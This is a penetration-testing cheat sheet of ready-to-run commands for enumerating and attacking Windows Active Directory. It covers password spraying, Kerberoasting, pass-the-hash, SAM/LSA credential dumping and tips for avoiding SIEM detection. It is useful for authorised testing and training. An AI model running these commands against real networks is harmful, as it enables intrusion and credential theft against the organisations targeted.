Windows Enumeration - Cheat Sheet

Enumerate a Windows / Active Directory environment from an attacker machine.
Organized by goal — pick the tool that fits your situation.
Replace the placeholders (<...>) with your own values.


════════════════════════════════════════════════════════════════════
PART 1 — UNAUTHENTICATED ENUMERATION
════════════════════════════════════════════════════════════════════

── Host & Service Discovery ─────────────────────────────────────────

Ping sweep — find live hosts before anything else:

    nmap -sn <target-range>

    Common target formats:
      192.168.50.0/24    entire subnet
      192.168.50.1-50    IP range
      192.168.50.10      single host

Quick port scan across the full range:

    nmap -Pn --top-ports=100 -oA top100 <target-range>

    -Pn          skip ping (treat all as up — use when ICMP is blocked)
    --top-ports  scan the N most commonly open ports
    -oA          save in all three formats (.nmap, .xml, .gnmap)

Full service scan — run only against confirmed live hosts:

    nmap -Pn -sCV -oA <output-name> -iL hosts_ips.txt -v

    -sC   run default NSE scripts
    -sV   detect service versions
    -iL   read targets from a file (one IP per line)
    -v    verbose — shows results as they arrive


── OS Fingerprinting ────────────────────────────────────────────────

    nmap -Pn -O -sV -iL hosts_ips.txt

    -O   OS fingerprinting (requires root / sudo)
    Combine with -sV to get service versions in the same run.


── DC Discovery ─────────────────────────────────────────────────────

Find all domain controllers via DNS — no credentials needed:

    nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>

Zone transfer attempt (usually blocked, always worth trying):

    dig axfr <domain> @<dns-server-ip>


── SMB Fingerprinting ───────────────────────────────────────────────

Grab domain name, OS, signing status, and DC hostnames in one shot:

    nxc smb <target-range>

    Also accepts: cme smb / crackmapexec smb (older aliases, same syntax)

    Key things to look for:
      Domain / Hostname   confirms domain name and DC candidates
      OS version          identifies unpatched or legacy systems
      Signing: False      SMB signing is OFF — relay attack target
      (Guest OK)          guest auth is enabled — try anonymous share listing


── Null Session / General Enumeration ───────────────────────────────

All-in-one unauthenticated recon — try this first on every SMB host:

    enum4linux-ng -A <target>

    When null sessions are allowed, pulls without credentials:
      domain info, user list, group list, share list, password policy

Manual RPC null session (when enum4linux-ng is not available):

    rpcclient -U "" -N <target>

    Useful commands once connected:
      srvinfo           OS info and server type
      enumdomusers      list all domain users
      enumdomgroups     list all domain groups
      querydominfo      min password length, lockout policy
      querydispinfo     user list with descriptions
      lsaquery          local security authority info


── User Enumeration ─────────────────────────────────────────────────

Option 1 — Kerbrute (fastest, completely silent):
No failed-logon events (event 4625) are generated — invisible to most SIEMs.

    kerbrute userenum --dc <dc-ip> -d <domain> <users.txt>

    Useful flags:
      -t 50        threads (default 10)
      -o <file>    save valid usernames to a file
      --downgrade  force RC4 (useful against older DCs)

Option 2 — nmap Kerberos script (no extra tool needed):

    nmap -p 88 --script=krb5-enum-users \
        --script-args="krb5-enum-users.realm='<domain>',userdb=<users.txt>" \
        <dc-ip>

Option 3 — rpcclient (only when null session works):

    rpcclient -U "" -N <target>  →  enumdomusers

How to build users.txt:
  Generate first.last / f.last / flast combos from LinkedIn, a company
  website, or any public employee directory.
  Tools: linkedin2username, namemash.py


── Share Enumeration ────────────────────────────────────────────────

Anonymous / guest share listing:

    nxc smb <target> -u '' -p '' --shares
    nxc smb <target> -u 'guest' -p '' --shares

Browse a share directly:

    smbclient //<target>/<share-name> -N

    READ or WRITE on non-default shares is a high-value finding.
    IPC$ with guest access allows null-session RPC.


════════════════════════════════════════════════════════════════════
PART 2 — AUTHENTICATED ENUMERATION
════════════════════════════════════════════════════════════════════

Any nxc command using -p <password> can use -H <NT-hash> instead
for pass-the-hash without knowing the plaintext password.


── Credential Verification & Spraying ───────────────────────────────

Verify a single credential:

    nxc smb <target> -u <username> -p <password>
    nxc smb <target> -u <username> -p <password> --shares

    [+]       auth succeeded
    (Pwn3d!)  user has local admin on that host

Spray across the network (NTLM — via SMB):

    nxc smb <target-range> -u <username> -p <password>
    nxc smb <target-range> -u <username> -H <NT-hash> --local-auth

    --local-auth   authenticate as a local account (not domain)

Spray via Kerberos (stealthier — triggers event 4771 not 4625):

    kerbrute passwordspray --dc <dc-ip> -d <domain> <users.txt> <password>

    Always check Password Policy before spraying — lockout thresholds
    apply regardless of which protocol you use.


── Password Policy ───────────────────────────────────────────────────

Check BEFORE any spray or brute-force attempt:

    nxc smb <dc-ip> -u <username> -p <password> --pass-pol

    Key fields:
      Lockout threshold    bad attempts before lockout
      Observation window   how long until the counter resets
      Lockout duration     how long an account stays locked
      Min password length  useful for building smarter wordlists

    Rule: spray at most (threshold - 1) attempts per observation window.


── User Enumeration ─────────────────────────────────────────────────

Option 1 — NetExec:

    nxc smb <dc-ip> -u <user> -p <pass> --users
    nxc smb <dc-ip> -u <user> -p <pass> --rid-brute    # RID cycling

Option 2 — Impacket (more detail: last logon, UAC flags, etc.):

    GetADUsers.py <domain>/<user>:<pass> -dc-ip <dc-ip> -all

Option 3 — ldapdomaindump (full dump to readable HTML/JSON files):

    ldapdomaindump -u '<domain>\<user>' -p <pass> <dc-ip> -o <output-dir>

    Produces: domain_users.html, domain_groups.html, domain_computers.html
    Open in a browser for a clean, sortable view of the entire domain.


── Group Enumeration ─────────────────────────────────────────────────

    nxc smb <dc-ip> -u <user> -p <pass> --groups

    Priority groups to find members of:
      Domain Admins, Enterprise Admins, Backup Operators,
      Account Operators, Server Operators, DNSAdmins


── Share Enumeration & Spidering ────────────────────────────────────

List all accessible shares:

    nxc smb <target> -u <user> -p <pass> --shares

Crawl shares recursively for sensitive files:

    nxc smb <target> -u <user> -p <pass> --spider-shares

    Looks for: passwords.txt, config files, scripts with hardcoded creds,
    backup files, web.config, id_rsa, .kdbx, and more.

Browse a share manually:

    smbclient //<target>/<share-name> -U <user>%<pass>


── LDAP Enumeration ──────────────────────────────────────────────────

Via NetExec:

    nxc ldap <dc-ip> -u <user> -p <pass> --users
    nxc ldap <dc-ip> -u <user> -p <pass> --groups
    nxc ldap <dc-ip> -u <user> -p <pass> --computers
    nxc ldap <dc-ip> -u <user> -p <pass> -M get-desc-users    # descriptions often contain passwords

Via ldapsearch (manual raw queries):

    ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w <pass> \
        -b "DC=<domain>,DC=<tld>" "(objectClass=user)"


── Kerberos Attack Surface ───────────────────────────────────────────

Find ASREPRoastable accounts (no pre-auth required — no creds needed*):

    # Without credentials (requires anonymous LDAP):
    GetNPUsers.py <domain>/ -dc-ip <dc-ip> -usersfile <users.txt> -no-pass

    # With credentials (more reliable):
    GetNPUsers.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request

    Hash format: $krb5asrep$ — crack with hashcat -m 18200
    * See the ASREP-roasting cheatsheet for cracking steps.

Find Kerberoastable accounts (SPNs — any domain user can do this):

    GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request

    Hash format: $krb5tgs$ — crack with hashcat -m 13100
    * See the Kerberoasting cheatsheet for cracking steps.


── AD Attack Path Mapping ────────────────────────────────────────────

BloodHound maps the entire AD and finds privilege escalation paths
visually. Run this the moment you have any domain credential.

From Linux (no foothold needed):

    bloodhound-python -u <user> -p <pass> -d <domain> \
        -dc <dc-fqdn> -c all --zip

From a Windows host (SharpHound):

    SharpHound.exe -c all --zipfilename bloodhound.zip

Import the .zip into BloodHound GUI. Key built-in queries:
  Shortest Paths to Domain Admins
  Find All Domain Admins
  Find Principals with DCSync Rights
  Kerberoastable Users with Paths to DA
  Find Computers where DA is Logged On


── Code Execution & Credential Dumping ──────────────────────────────

Requires local admin on the target.

Run a command:

    nxc smb <target> -u <user> -p <pass> -x "<command>"        # CMD
    nxc smb <target> -u <user> -p <pass> -X "<ps-command>"     # PowerShell

Dump local SAM hashes (local account NT hashes):

    nxc smb <target> -u <user> -p <pass> --sam

Dump LSA secrets (cached domain credentials, service account passwords):

    nxc smb <target> -u <user> -p <pass> --lsa

Recovered NT hashes → pass-the-hash with -H <NT-hash> in any nxc command.
See the Pass-the-Hash cheatsheet for next steps.


════════════════════════════════════════════════════════════════════
RECOMMENDED WORKFLOW
════════════════════════════════════════════════════════════════════

Unauthenticated:
  nmap sweep → nxc smb <range> → nslookup SRV → enum4linux-ng -A <dc>
  → anonymous share listing → kerbrute userenum → build valid user list

Authenticated (first credential):
  nxc verify creds → --pass-pol (before spraying) → bloodhound-python
  → GetNPUsers / GetUserSPNs → nxc ldap get-desc-users
  → spray / lateral movement → --sam / --lsa

Key ideas:
- Always do full unauthenticated recon before using credentials.
- Kerbrute username enum is the safest recon step — no logon events.
- enum4linux-ng is the fastest all-in-one null-session first pass.
- BloodHound is the most powerful authenticated step — run it first.
- SMB Signing: False + valid creds = relay attack opportunity.
  See the SMB-relay cheatsheet for next steps.
